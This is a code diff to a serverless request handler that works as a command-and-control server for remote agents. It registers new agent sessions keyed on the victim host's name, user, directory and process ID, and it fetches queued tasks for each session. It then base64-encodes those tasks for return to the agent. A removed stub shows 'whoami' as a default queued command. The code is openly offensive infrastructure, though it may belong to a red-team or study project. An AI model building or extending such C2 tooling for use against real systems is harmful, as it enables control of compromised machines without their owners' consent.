@@ -1,8 +1,11 @@
+#!/usr/bin/env python3
 
+import base64
 import json
 import logging
 
 import agent_session
+import agent_tasks
 
 
 def handler(event, context):
@@ -37,48 +40,47 @@ def route_request(path: str, event_body):
 
 
 def handle_get_task(event_body):
-    logging.info("stub - handle_get_task")
 
     # derive session ID from seed values: hostname, username, and agent directory
+    logging.info("deriving session ID from agent info")
     session_id = agent_session.derive_session_id(
         event_body["hostname"], event_body["username"], event_body["agent_dir"], event_body["agent_pid"])
 
     logging.info(f"agent session ID is: {session_id}")
 
-    # is this an existing session
+    # check if session is already registered
+    logging.info("checking if agent is registered to C2 server")
     is_registered = agent_session.is_agent_registered(session_id)
 
+    # if session is not registered, register to C2 server
     if not is_registered:
+        logging.info("registering new agent session to C2 server")
         agent_session.register_agent(session_id, event_body)
+        # ToDo - post new agent notification somewhere - maybe SNS?
 
-    task = get_task(session_id)
+    # get task for current session ID
+    logging.info("getting agent task")
+    task = agent_tasks.get_task(session_id)
 
-    delete_queued_task(session_id)
+    task_b64 = ""
+    if task != "":
+        # convert task to json
+        logging.info("converting task to JSON")
+        task_json = json.dumps(task)
+        print(task_json)
+
+        # base64 encode the task so it is easier to bring back
+        logging.info("base64 encoding task:")
+        task_b64 = base64.b64encode(bytes(task_json, "utf-8"))
+        print(task_b64)
 
     return {
         'statusCode': 200,
         'headers': {
             'Content-Type': 'text/plain'
         },
-        'body': task
+        'body': task_b64
     }
-
-
-def get_task(session_id):
-    logging.info(f"checking tasks for session: {session_id}")
-    # read every file in the tasks bucket
-    # if the session_id == task_file["session_id"]:
-    # get the task and arguments
-    # put task and args in a list
-    return "whoami"
-
-
-def delete_queued_task(session_id):
-    logging.info(f"deleting queued tasks for: {session_id}")
-    # list every file in S3
-    # if file name equals session id
-    # delete file
-    return
 
 
 def handle_post_task_output(event_body):
